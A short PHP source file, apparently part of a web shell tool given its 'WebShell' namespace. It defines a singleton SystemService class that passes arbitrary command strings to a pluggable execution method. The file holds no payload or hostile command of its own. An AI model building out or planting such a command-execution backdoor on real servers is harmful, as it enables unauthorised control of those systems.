<?php
namespace WebShell;

class SystemService
{
    // Singleton instance
    private static $instance = null;

    // Class attributes
    private $executionMethod = null;

    // A singleton class should not be created using new, cloned or deserialized
    private function __construct() { }
    private function __clone() { }
    public function __wakeup()
    {
        throw new \Exception('Cannot unserialize a singleton');
    }

    public static function getInstance()
    {
        if (self::$instance == null) {
            self::$instance = new SystemService();
        }

        return self::$instance;
    }
    
    public function execute($cmd)
    {
        return $this->executionMethod->execute($cmd);
    }

    public function setExecutionMethod($executionMethod)
    {
        $this->executionMethod = $executionMethod;
    }

}
?>
